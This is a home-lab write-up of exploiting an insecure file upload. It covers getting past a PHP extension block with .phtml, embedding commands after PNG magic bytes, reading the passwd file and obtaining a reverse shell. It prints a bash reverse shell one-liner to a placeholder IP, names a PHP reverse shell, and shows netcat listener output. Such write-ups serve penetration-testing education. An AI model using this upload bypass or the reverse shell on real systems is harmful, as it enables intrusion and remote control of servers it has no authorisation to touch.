# Challange - Insecure File Upload

- Upon navigating to the site I got this interface:

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/b6c75ff4-6b49-485a-882e-fdaf7ac601bb)

- On trying to upload text or other extension files except "png" and "jpg" I got the error message:

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/6b2fa0c0-958d-4ef7-bbe6-20c212027a82)

- So, I go with uploading a png file and intercept the request to the burp suite to analyze the request:

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/856aa3d2-fb1e-4a44-ae77-8389a24534b6)

- After several tries, I can't able to upload the file, it returns an error:

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/d537bd32-f586-4ff3-9b8c-d6ea5c19d9fd)

- Quick ping to mind, maybe the extension "PHP" is in the blocked list. I tried with other extensions and see if they work.
- I tried with the extension ".sh" and luckily it works
- I inject a bash reverse shell into the image png magic bytes.
- cmd: `bash -i >& /dev/tcp/<IP>/4242 0>&1`

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/959b76b2-285b-4d4a-870a-95ed0d732481)

- Unfortunately, on navigating to the "bash.sh" file in the URL I got no results.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/65761330-e5d5-42d3-8830-1d4f19782050)

- On enumerating a little deeper, I notice that the website is working on PHP and PHP extension is blocked by the server.
- I do a quick search on Google regarding bypassing the php extension blockage.
- There I get to know about other extensions that worked with PHP such as:

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/ea6fedaa-9c41-4f28-8d60-76990a57d356)

- I quickly changed the file extension from "image.php" to "image.phtml" and send a request through Burp Suite's repeater by inserting command line code in image png magick bytes.
- I get succeed in uploading the file with the extension ".phtml"
  
![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/c0e9ea79-f918-4f57-b901-abb1267e09c6)

- On navigating to the file through the URL I successfully get the revert by embedding the command and argument into the URL.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/922d4f3f-8c8b-4e34-b072-175284c411af)

- I also get succeeded in fetching "passwd" file from the system.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/d817968f-322c-4e95-950a-2052901a087c)

- To get the reverse shell to my system I use PHP reverse shell by pentest-monkey and replace it in place of the previous injected command.
- Netcat is set for listening.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/30db9361-ad05-4b99-9c52-fd8425c48693)

- On navigating to the uploaded file I got a reverse shell to my system successfully

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/c4b76909-ef86-4471-b723-42aa4ac6ac8a)

```bash
└─$ rlwrap nc -nvlp 1234
listening on [any] 1234 ...
connect to [xxx.xxx.xxx.89] from (UNKNOWN) [xxx.xxx.xx.4] 39498
Linux d19181ed4936 6.3.0-kali1-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.3.7-1kali1 (2023-06-29) x86_64 GNU/Linux
 08:36:38 up  5:06,  0 users,  load average: 1.22, 1.41, 1.59
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
```
